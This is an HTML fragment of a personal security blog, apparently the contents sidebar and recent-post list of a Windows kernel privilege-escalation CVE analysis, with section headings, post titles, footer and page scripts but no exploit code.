toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tagWND"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">tagWND</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CreateWindowsEx%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">CreateWindowsEx调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#user32-ConsoleControl%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">user32!ConsoleControl调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SetWindowLong%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">SetWindowLong调试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.2.2.</span> <span class="toc-text">漏洞点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP%E7%BC%96%E5%86%99"><span class="toc-number">1.3.</span> <span class="toc-text">EXP编写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hook-xxxClientAllocWindowClassExtraBytes"><span class="toc-number">1.3.1.</span> <span class="toc-text">Hook xxxClientAllocWindowClassExtraBytes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AA%97%E5%8F%A3%E5%8F%A5%E6%9F%84"><span class="toc-number">1.3.2.</span> <span class="toc-text">获取窗口句柄</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="toc-number">1.3.3.</span> <span class="toc-text">内存布局</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">任意地址写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">任意地址读</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2Token"><span class="toc-number">1.3.4.</span> <span class="toc-text">替换Token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%86%85%E5%AD%98"><span class="toc-number">1.3.5.</span> <span class="toc-text">修复内存</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%AE%E8%BD%AF%E8%A1%A5%E4%B8%81"><span class="toc-number">1.5.</span> <span class="toc-text">微软补丁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.6.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/04/26/CVE-2023-21768%20Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="CVE-2023-21768 Windows内核提权漏洞"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2023-21768 Windows内核提权漏洞"/></a><div class="content"><a class="title" href="/2023/04/26/CVE-2023-21768%20Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="CVE-2023-21768 Windows内核提权漏洞">CVE-2023-21768 Windows内核提权漏洞</a><time datetime="2023-04-26T10:38:45.000Z" title="Created 2023-04-26 18:38:45">2023-04-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/10/CVE-2021-1732%20Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="CVE-2021-1732 window内核提取漏洞"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2021-1732 window内核提取漏洞"/></a><div class="content"><a class="title" href="/2023/04/10/CVE-2021-1732%20Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="CVE-2021-1732 window内核提取漏洞">CVE-2021-1732 window内核提取漏洞</a><time datetime="2023-04-10T10:38:45.000Z" title="Created 2023-04-10 18:38:45">2023-04-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/20/CVE-2014-4113%20window%E5%86%85%E6%A0%B8%E6%8F%90%E5%8F%96%E6%BC%8F%E6%B4%9E/" title="CVE-2014-4113 window内核提取漏洞"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2014-4113 window内核提取漏洞"/></a><div class="content"><a class="title" href="/2023/03/20/CVE-2014-4113%20window%E5%86%85%E6%A0%B8%E6%8F%90%E5%8F%96%E6%BC%8F%E6%B4%9E/" title="CVE-2014-4113 window内核提取漏洞">CVE-2014-4113 window内核提取漏洞</a><time datetime="2023-03-20T10:38:45.000Z" title="Created 2023-03-20 18:38:45">2023-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/18/DesktopScreen%20%E6%A1%8C%E9%9D%A2%E5%B0%8F%E5%B1%8F%E5%B9%95/" title="DesktopScreen 桌面小屏幕"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DesktopScreen 桌面小屏幕"/></a><div class="content"><a class="title" href="/2023/03/18/DesktopScreen%20%E6%A1%8C%E9%9D%A2%E5%B0%8F%E5%B1%8F%E5%B9%95/" title="DesktopScreen 桌面小屏幕">DesktopScreen 桌面小屏幕</a><time datetime="2023-03-18T09:38:45.000Z" title="Created 2023-03-18 17:38:45">2023-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/23/StealthHook/" title="StealthHook"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="StealthHook"/></a><div class="content"><a class="title" href="/2022/12/23/StealthHook/" title="StealthHook">StealthHook</a><time datetime="2022-12-23T09:38:45.000Z" title="Created 2022-12-23 17:38:45">2022-12-23</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By The_Itach1</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">木叶飞舞之处，火亦生生不息</div><div class="icp"><a><span></span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>